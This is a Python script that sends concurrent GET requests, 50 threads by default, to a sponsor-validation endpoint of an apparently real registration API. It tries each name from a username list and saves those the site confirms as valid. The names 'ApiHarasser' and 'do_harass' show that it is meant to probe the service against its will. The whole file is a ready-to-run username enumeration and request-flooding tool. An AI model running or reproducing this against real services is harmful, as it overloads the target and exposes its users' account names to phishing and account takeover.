import concurrent.futures
from pathlib import Path
from functions import read_data_from_file, write_to_file
from Harasser import ApiHarasser, RequestType
from logger import LOGGER
import sys

BASE_DIR = Path(__file__).resolve().parent
FILES_DIR = BASE_DIR / "assets"

USERNAMES = read_data_from_file(str(BASE_DIR / "assets" / "usernames.txt"))

requests_counter = 0

harasser = ApiHarasser(
    "https://api.riseoo.com/Registration/ValidateSponsor/", RequestType.GET)


def do_harass(username: str) -> None:
    global requests_counter
    requests_counter += 1
    parsed_data = harasser.do_request(username)
    if (parsed_data and parsed_data.isSuccess):
        print("Successful request with username: ",
              parsed_data.data.sponsorUsername)
        write_to_file(FILES_DIR / "valid_usernames.txt",
                      parsed_data.data.sponsorUsername)
        LOGGER.info(f"new sponsor: {parsed_data.data.sponsorUsername}")

    else:
        print(
            f"{username} is not a sponsor... {requests_counter}/{len(USERNAMES)}")


def main() -> None:
    workers = 50
    if len(sys.argv) > 1:
        if sys.argv[1].isnumeric():
            workers = int(sys.argv[1])

    print(f"== Initialized with {workers} workers ==\n")
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
        futures = [executor.submit(do_harass, username)
                   for username in USERNAMES]
        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()
            except Exception as exc:
                LOGGER.error(f"Job failed: {exc}")


if __name__ == "__main__":
    main()
